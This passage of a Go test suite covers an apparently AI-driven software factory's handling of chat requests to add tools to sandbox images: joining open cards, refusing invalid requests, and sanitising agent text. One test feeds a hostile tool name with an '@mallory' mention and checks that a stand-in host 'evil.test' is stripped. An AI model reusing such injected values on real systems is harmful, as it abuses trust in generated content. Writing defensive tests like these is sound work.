	}
	before := store.tasks[first.Park.ToolTask].Objective
	join := "Requested in the project chat by sebastian: sox in image video too: mix the sound."
	for range 2 {
		card, filed, err := r.RequestImage(ctx, codeRepo, "sox", "mix the sound", "video", "sebastian")
		if err != nil || filed || card.ID != first.Park.ToolTask || card.IssueNumber != 31 {
			t.Fatalf("join = %+v %v %v, want the open card %s", card, filed, err, first.Park.ToolTask)
		}
		if got := store.tasks[first.Park.ToolTask].Objective; got != before+"\n\n"+join || !slices.Equal(rf.comments, []string{"31 " + join}) || len(rf.issues) != 1 {
			t.Fatalf("objective %q, comments %q, issues %d: want the join once", got, rf.comments, len(rf.issues))
		}
	}
	if !slices.Equal(store.deps["t-asker"], []string{first.Park.ToolTask}) || len(store.deps) != 1 {
		t.Fatalf("deps %v: the chat's ask adds none", store.deps)
	}

	// the chat files a card of its own for another image; asking again is the card's own ask
	own, filed, err := r.RequestImage(ctx, codeRepo, "pandoc", "render the docs", "docs", "sebastian")
	if err != nil || !filed || len(rf.issues) != 2 {
		t.Fatalf("own card = %+v %v %v, issues %d", own, filed, err, len(rf.issues))
	}
	if again, filed, err := r.RequestImage(ctx, codeRepo, "pandoc", "render the docs", "docs", "sebastian"); err != nil || filed || again.ID != own.ID ||
		store.tasks[own.ID].Objective != own.Objective || len(rf.comments) != 1 {
		t.Fatalf("the same ask again = %+v %v %v, comments %q; want no change", again, filed, err, rf.comments)
	}
	tk := store.tasks["t-second"]
	tk.Image = "docs"
	store.tasks["t-second"] = tk
	p, err := r.ParkForTool(ctx, "t-second", "latex", "typeset")
	if err != nil || p.Park.ToolTask != own.ID || !strings.HasSuffix(store.tasks[own.ID].Objective, "\n\nCard #42 (t-second) needs latex in image docs too: typeset") {
		t.Fatalf("a session's join of the chat's card = %+v %v, objective %q", p, err, store.tasks[own.ID].Objective)
	}

	tool := store.tasks[own.ID]
	tool.Status = "running"
	store.tasks[own.ID] = tool
	if next, filed, err := r.RequestImage(ctx, codeRepo, "pandoc", "render the docs", "docs", "sebastian"); err != nil || !filed || next.ID == own.ID || len(rf.issues) != 3 {
		t.Fatalf("an ask after the card started = %+v %v %v, issues %d; want a card of its own", next, filed, err, len(rf.issues))
	}
}

// The chat's ask is refused where a session's is: a new image past the
// project's MaxImages names and the configuration repository; and so are
// arguments out of bounds and a project whose cards run no agent. Each
// refusal names what to do and files nothing.
func TestRequestImageRefusals(t *testing.T) {
	const file = "images:\n  default:\n    apt: [jq]\n  video:\n    apt: [ffmpeg]\n  docs:\n    apt: [pandoc]\n"
	r, _, rf, _ := parkRig(t, file, "default", "browser")
	ctx := context.Background()
	args := "tool (1 to 80 characters) and need (1 to 600 characters) are required, each on one line without control characters"
	for _, tc := range []struct{ tool, need, image, want string }{
		{"sox", "mix the sound", "", "The factory refuses: image sox would be new, and project ai-software-factory-code has 4 images already (browser, default, docs, video), " +
			"the most a project may have. Add the tool to one of them with image, or file a card that removes an image from factory/images.yaml."},
		{"", "mix", "", args},
		{"sox", "", "", args},
		{strings.Repeat("x", 81), "mix", "", args},
		{"sox", strings.Repeat("é", 601), "", args},
		{"sox", "mix\nthe sound", "", args},
		{"sox", "mix", "Video", "image Video: lowercase letters, digits and dashes, at most 32; leave it out for an image named after the tool."},
	} {
		_, _, err := r.RequestImage(ctx, codeRepo, tc.tool, tc.need, tc.image, "sebastian")
		var refused ErrImageRequest
		if !errors.As(err, &refused) || string(refused) != tc.want {
			t.Errorf("RequestImage(%q, %q, %q) = %v, want the refusal %q", tc.tool, tc.need, tc.image, err, tc.want)
		}
	}
	if len(rf.issues) != 0 {
		t.Fatalf("issues %q, want none", rf.issues)
	}
	if card, filed, err := r.RequestImage(ctx, codeRepo, "sox", "mix the sound", "video", "sebastian"); err != nil || !filed || len(rf.issues) != 1 {
		t.Fatalf("an ask into a declared image = %+v %v %v", card, filed, err)
	}

	r.Imager = &Imager{Config: &ForgejoConfig{Repo: Repo{Owner: "sf", Name: "ai-software-factory-code"}}}
	_, _, err := r.RequestImage(ctx, codeRepo, "sox", "mix", "", "sebastian")
	var refused ErrImageRequest
	if want := "The factory refuses: sf/ai-software-factory-code is the factory's configuration repository, which declares no sandbox images."; !errors.As(err, &refused) || string(refused) != want {
		t.Fatalf("an ask on the configuration repository = %v, want %q", err, want)
	}
	r.Imager = nil
	c := r.cfg.Policy().Projects["ai-software-factory-code"]
	c.Agents = policy.AgentsNone
	r.cfg.Policy().Projects["ai-software-factory-code"] = c
	_, _, err = r.RequestImage(ctx, codeRepo, "sox", "mix", "", "sebastian")
	if want := "The factory refuses: project ai-software-factory-code runs no agents, so none of its cards runs in a sandbox image."; !errors.As(err, &refused) || string(refused) != want {
		t.Fatalf("an ask on a project without agents = %v, want %q", err, want)
	}
	if len(rf.issues) != 1 {
		t.Fatalf("issues %q, want the one ask into video", rf.issues)
	}
}

// The tool and the need are the chat agent's: the tool card carries them
// through the outbound sanitiser, as a session's ask does.
func TestRequestImageNeutralisesTheAgentsText(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	v := r.cfg.Policy()
	v.Document.LinkHosts = []string{"docs.example.org"}
	r.cfg.Policy = func() policy.Version { return v }
	r.forgejo.PublicURL = "https://git.example"
	card, _, err := r.RequestImage(context.Background(), codeRepo, "ffmpeg @mallory", hostile, "", "sebastian")
	if err != nil {
		t.Fatal(err)
	}
	want := "Add ffmpeg ＠mallory to image ffmpeg-mallory\n\nRequested in the project chat by sebastian: " + hostileOut + ".\n\n"
	if len(rf.issues) != 1 || !strings.HasPrefix(rf.issues[0], want) || strings.Contains(rf.issues[0], "evil.test") || strings.Contains(rf.issues[0], "@mallory") {
		t.Fatalf("issues %q, want the card opening %q", rf.issues, want)
	}
	if obj := store.tasks[card.ID].Objective; !strings.HasPrefix(obj, want) {
		t.Fatalf("objective %q, want it opening %q", obj, want)
	}
}
